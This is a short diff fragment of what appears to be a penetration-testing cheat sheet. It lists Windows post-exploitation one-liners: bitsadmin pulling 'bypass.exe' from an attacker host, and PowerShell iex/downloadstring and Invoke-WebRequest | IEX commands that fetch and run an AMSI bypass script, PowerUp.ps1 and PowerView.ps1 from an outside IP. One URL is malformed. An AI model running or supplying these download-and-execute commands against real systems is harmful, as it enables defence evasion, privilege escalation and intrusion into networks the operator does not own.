@@ -21,5 +21,10 @@ bitsadmin /create 1 bitsadmin /addfile 1 http://lhost/bypass.exe C:\Windows\Task
 ```
 iex(new-object net.webclient).downloadstring('http://192.168.45.201amsi-reflect.ps1')
 iex(new-object net.webclient).downloadstring('http://192.168.45.201/PowerUp.ps1'); Invoke-AllChecks
+
+Invoke-WebRequest http://IP/PowerView.ps1 -OutFile PowerView.ps1
+Invoke-WebRequest http://IP/PowerView.ps1 -UseBasicParsing | IEX
 ```
+
+
 
